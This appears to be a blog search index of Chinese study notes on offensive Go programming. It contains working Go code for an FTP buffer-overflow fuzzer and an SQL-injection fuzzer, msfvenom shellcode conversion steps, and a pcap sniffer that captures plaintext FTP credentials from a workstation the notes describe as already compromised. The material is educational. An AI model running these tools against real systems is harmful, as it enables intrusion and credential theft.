<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>9.1Fuzz</title>
      <link href="/2023/02/01/Go/9.1Fuzz/"/>
      <url>/2023/02/01/Go/9.1Fuzz/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>模糊测试是一种将大量数据发送到目标应用程序，迫使目标产生异常行为的技术。进而发现编码错误或安全缺陷，并加以利用</li></ul><h4 id="缓冲区溢出FUZZ"><a href="#缓冲区溢出FUZZ" class="headerlink" title="缓冲区溢出FUZZ"></a>缓冲区溢出FUZZ</h4><ul><li>做过pwn题目的师傅们对栈溢出很熟悉。</li><li>q1和q2处需要注意。<ul><li>连接异常，可能中途服务中断。可能存在缓冲区溢出。但如果</li><li>如果建立连接后无法关闭连接，可能表示远程FTP服务突然异常断开。这可能不是溢出引起，记录异常情况，程序将继续执行</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bufio&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2500</span>; i++ &#123; <span class="comment">//FUZZ 2500次</span></span><br><span class="line">      conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;10.0.1.20:21&quot;</span>) <span class="comment">//tcp连接</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Error at offset %d: %s\n&quot;</span>, i, err) <span class="comment">//q1</span></span><br><span class="line">      &#125;</span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">//创建bufio缓冲去读响应内容。显示读取为一行</span></span><br><span class="line"></span><br><span class="line">      user := <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="keyword">for</span> n := <span class="number">0</span>; n &lt;= i; n++ &#123; <span class="comment">//要FUZZ测试的USER</span></span><br><span class="line">         user += <span class="string">&quot;A&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      raw := <span class="string">&quot;USER %s\n&quot;</span></span><br><span class="line">      fmt.Fprintf(conn, raw, user)           <span class="comment">//向目标FTP服务器发送USER命令，输入用户名</span></span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">      raw = <span class="string">&quot;PASS password\n&quot;</span></span><br><span class="line">      fmt.Fprint(conn, raw)                  <span class="comment">//向目标FTP服务器发送PASS命令，输入密码</span></span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> err := conn.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;[!] Unable to close connection. Is service alive?&quot;</span>) <span class="comment">//q2</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201133850967.png" alt="image-20230201133850967"></p><h5 id="改进："><a href="#改进：" class="headerlink" title="改进："></a>改进：</h5><ul><li>可以通过多种方式改进上述代码，以提高其灵活性和便利性。例如，你可能希望删除硬编码的P、端口和迭代值，而不是通过命令行参数或配置文件将其包括在内。你可以试着以此方式改进代码。此外，还可以扩展代码，以便在身份验证后对命令进行模糊测试。具体来说，可以更新该模糊测试器以对CWD&#x2F;CD命令进行模糊测试。各种工具历来都容易受到与处理CWD&#x2F;CD命令相关的缓冲区溢出的影响，这使得此命令成为模糊测试的一个好目标。</li></ul><h4 id="SQL注入模糊测试"><a href="#SQL注入模糊测试" class="headerlink" title="SQL注入模糊测试"></a>SQL注入模糊测试</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bytes&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   payloads := []<span class="type">string</span>&#123; <span class="comment">//要尝试的载荷</span></span><br><span class="line">      <span class="string">&quot;baseline&quot;</span>,</span><br><span class="line">      <span class="string">&quot;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;(&quot;</span>,</span><br><span class="line">      <span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   sqlErrors := []<span class="type">string</span>&#123; <span class="comment">//SQL错误信息中的关键字</span></span><br><span class="line">      <span class="string">&quot;SQL&quot;</span>,</span><br><span class="line">      <span class="string">&quot;MySQL&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ORA-&quot;</span>,</span><br><span class="line">      <span class="string">&quot;syntax&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   errRegexes := []*regexp.Regexp&#123;&#125; <span class="comment">//1.构建正则切片errRegexes</span></span><br><span class="line">   <span class="keyword">for</span> _, e := <span class="keyword">range</span> sqlErrors &#123;</span><br><span class="line">      re := regexp.MustCompile(fmt.Sprintf(<span class="string">&quot;.*%s.*&quot;</span>, e))</span><br><span class="line">      errRegexes = <span class="built_in">append</span>(errRegexes, re)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, payload := <span class="keyword">range</span> payloads &#123; <span class="comment">//2.遍历每个载荷</span></span><br><span class="line">      client := <span class="built_in">new</span>(http.Client)</span><br><span class="line">      body := []<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;username=%s&amp;password=p&quot;</span>, payload)) <span class="comment">//2.1构造完整载荷</span></span><br><span class="line">      req, err := http.NewRequest(                                   <span class="comment">//2.2构建POST请求</span></span><br><span class="line">         <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">         <span class="string">&quot;http://10.0.1.20:8080/WebApplication/login.jsp?debug=true&quot;</span>,</span><br><span class="line">         bytes.NewReader(body),</span><br><span class="line">      )</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to generate request: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>) <span class="comment">//2.3添加Header</span></span><br><span class="line">      resp, err := client.Do(req)                                         <span class="comment">//2.4发送HTTP请求</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to process response: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      body, err = ioutil.ReadAll(resp.Body) <span class="comment">//2.5读取响应内容</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to read response body: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      resp.Body.Close() <span class="comment">//2.6关闭连接</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> idx, re := <span class="keyword">range</span> errRegexes &#123; <span class="comment">//3.遍历HTTP响应内容是否命中errRegexes</span></span><br><span class="line">         <span class="keyword">if</span> re.MatchString(<span class="type">string</span>(body)) &#123;</span><br><span class="line">            fmt.Printf(</span><br><span class="line">               <span class="string">&quot;[+] SQL Error found (&#x27;%s&#x27;) for payload: %s\n&quot;</span>,</span><br><span class="line">               sqlErrors[idx],</span><br><span class="line">               payload,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20230201141058178.png" alt="image-20230201141058178"></p><ul><li>书中还提到了代码功能的改进和添加</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.3构造shellcode</title>
      <link href="/2023/02/01/Go/9.3%E6%9E%84%E9%80%A0shellcode/"/>
      <url>/2023/02/01/Go/9.3%E6%9E%84%E9%80%A0shellcode/</url>
      
        <content type="html"><![CDATA[<h4 id="msf生成shellcode"><a href="#msf生成shellcode" class="headerlink" title="msf生成shellcode"></a>msf生成shellcode</h4><ul><li>由于msf没有原生的Go格式。我们需要把常用的格式(C，hex，num，raw，Base64)转换成Go能使用的切片格式</li></ul><h5 id="C转换"><a href="#C转换" class="headerlink" title="C转换"></a>C转换</h5><ul><li>删除分号，并更改换行符。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload := []<span class="type">byte</span>(<span class="string">&quot;\xfc\xe8\x82...&quot;</span>).</span><br></pre></td></tr></table></figure><h5 id="hex转换"><a href="#hex转换" class="headerlink" title="hex转换"></a>hex转换</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload, err := hex.DecodeString(<span class="string">&quot;hex数据&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="num转换"><a href="#num转换" class="headerlink" title="num转换"></a>num转换</h5><ul><li>可以之间在字节切片中使用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload := []<span class="type">byte</span>&#123;</span><br><span class="line"><span class="number">0xfc</span>,<span class="number">0xe8</span>,<span class="number">0x82</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="raw转换"><a href="#raw转换" class="headerlink" title="raw转换"></a>raw转换</h4><ul><li>原生的二进制数据，会有不可见字符。我们将其转成num形式。可以使用Linux的xxd命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload] [options] -f raw | xxd -i</span><br></pre></td></tr></table></figure><h5 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h5><ul><li>虽然msfvenom不含纯Base64编码器，但遇到Base64格式的二进制数据很常见</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload][options]-f raw | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure><ul><li>与C输出类似，生成的载荷包含换行符。需要进行处理，可以使用Linux</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload][options]-f raw | base64 | tr -d <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li>使用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload, err := base64.strEncoding.DecodeString(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="关于汇编"><a href="#关于汇编" class="headerlink" title="关于汇编"></a>关于汇编</h4><ul><li>谈及shellcode，离不开汇编。</li><li>但Go与汇编的集成是有限的；Go不支持内联汇编。Go仅支持基于Plan9操作系统的—种汇编变体，这种汇编语法几乎不存在。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.2代码移植Go</title>
      <link href="/2023/02/01/Go/9.2%E4%BB%A3%E7%A0%81%E7%A7%BB%E6%A4%8DGo/"/>
      <url>/2023/02/01/Go/9.2%E4%BB%A3%E7%A0%81%E7%A7%BB%E6%A4%8DGo/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>出于各种原因，我们可能需要将现有漏洞利用移植到Go中</li><li>其中原因可能是现有的利用代码已损坏、不完整或与你要针对的系统或版本不兼容</li><li>尽管你可以使用创建时使用的相同语言来扩展或更新已损坏或不完整的代码</li><li>但是G0可以为你提供轻松的交叉编译、一致的语法和缩进规则以及强大的标准库。</li><li>所有这一切都将使得利用代码具有更高的可移植性和可读性，而不会影响其功能。</li></ul><h4 id="从python移植"><a href="#从python移植" class="headerlink" title="从python移植"></a>从python移植</h4><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201141727592.png" alt="image-20230201141727592"></p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.被动嗅探</title>
      <link href="/2023/02/01/Go/8.%E8%A2%AB%E5%8A%A8%E5%97%85%E6%8E%A2/"/>
      <url>/2023/02/01/Go/8.%E8%A2%AB%E5%8A%A8%E5%97%85%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="使用pcap子包识别设备"><a href="#使用pcap子包识别设备" class="headerlink" title="使用pcap子包识别设备"></a>使用pcap子包识别设备</h4><ul><li>需要包  github.com&#x2F;google&#x2F;gopacket&#x2F;pcap</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123;</span><br><span class="line">      fmt.Println(device.Name)</span><br><span class="line">      <span class="keyword">for</span> _, address := <span class="keyword">range</span> device.Addresses &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;    IP:      %s\n&quot;</span>, address.IP)</span><br><span class="line">         fmt.Printf(<span class="string">&quot;    Netmask: %s\n&quot;</span>, address.Netmask)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131202558116.png" alt="image-20230131202558116"></p><h4 id="实时捕获和结果过滤"><a href="#实时捕获和结果过滤" class="headerlink" title="实时捕获和结果过滤"></a>实时捕获和结果过滤</h4><ul><li>如何使用gopacket包在线捕获实时数据包</li><li>如何使用BRF语法过滤数据包（<a href="http://www.tcpdump.org/manpages/pcap-filter.7.html%EF%BC%89">http://www.tcpdump.org/manpages/pcap-filter.7.html）</a></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (  <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   iface    = <span class="string">&quot;enp0s5&quot;</span>          <span class="comment">//接口名称</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">1600</span>)       <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">false</span>             <span class="comment">//是否以混杂模式运行</span></span><br><span class="line">   timeout  = pcap.BlockForever <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp and port 80&quot;</span> <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>             <span class="comment">//是否找到</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123;   <span class="comment">//检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span>            <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123;                     <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)  <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123;  <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType())  <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123;  <span class="comment">//4.读取数据包并输出  (source.Packets()返回一个channel，从中读取)</span></span><br><span class="line">      fmt.Println(packet)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>尽管输出结果不太容易理解，但每层都进行了很好的隔离</li><li>现在可以使用实用函数packer.ApplicationLayer()和packet.Data()来检索，再使用hex.Dump()显示内容</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131205635676.png" alt="image-20230131205635676"></p><h4 id="嗅探和显示明文用户凭证（FTP案例）"><a href="#嗅探和显示明文用户凭证（FTP案例）" class="headerlink" title="嗅探和显示明文用户凭证（FTP案例）"></a>嗅探和显示明文用户凭证（FTP案例）</h4><ul><li>现在，大多数组织使用的都是交换网络，即直接在两个端点之间发送数据；</li><li>而不是通过广播发送数据，这使得在目标组织环境中被动捕获流量变得更加困难</li><li>当与地址解析协议ARP中毒(一种可以强迫端点与交换网络上的恶意设备进行通信的攻击)配合攻击时；</li><li>或者当你从被攻陷的用户工作站中，<strong>秘密嗅探</strong>出站流量时；</li><li>一下明文嗅探攻击会非常有效。此示例假设我们以及攻陷了一个用户工作站，且仅专注捕获FTP流量(代码简短)</li><li>要提取或检查其他层和数据，可以采取与此类似的方法。在本示例中只需要应用层在和即可。<ul><li>相比上面的代码，只需要更改10余行</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bytes&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ( <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   iface    = <span class="string">&quot;\\Device\\NPF_&#123;B3E230B9-9E26-4530-A81D-3FD548C39768&#125;&quot;</span> <span class="comment">//接口名称</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">1600</span>)                                            <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">false</span>                                                  <span class="comment">//是否以混杂模式运行</span></span><br><span class="line">   timeout  = pcap.BlockForever                                      <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp and dst port 21&quot;</span>                                  <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>                                                  <span class="comment">//是否找到</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123; <span class="comment">//检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span> <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123; <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout) <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123; <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType()) <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123;                        <span class="comment">//4.读取数据包</span></span><br><span class="line">      appLayer := packet.ApplicationLayer() <span class="comment">//5.通过检查packet.ApplicationLayer()的响应值来确定是否存在应用层</span></span><br><span class="line">      <span class="keyword">if</span> appLayer == <span class="literal">nil</span> &#123;                  <span class="comment">//不存在，continue</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      payload := appLayer.Payload()         <span class="comment">//6.从应用层提取载荷(FTP命令/数据)</span></span><br><span class="line">      <span class="comment">/*** 提取载荷后，检查载荷中是否包含USER或PASS命令 ***/</span></span><br><span class="line">      <span class="keyword">if</span> bytes.Contains(payload, []<span class="type">byte</span>(<span class="string">&quot;USER&quot;</span>)) &#123;</span><br><span class="line">         fmt.Print(<span class="type">string</span>(payload))</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> bytes.Contains(payload, []<span class="type">byte</span>(<span class="string">&quot;PASS&quot;</span>)) &#123;</span><br><span class="line">         fmt.Print(<span class="type">string</span>(payload))</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131214813093.png" alt="image-20230131214813093"></p><h4 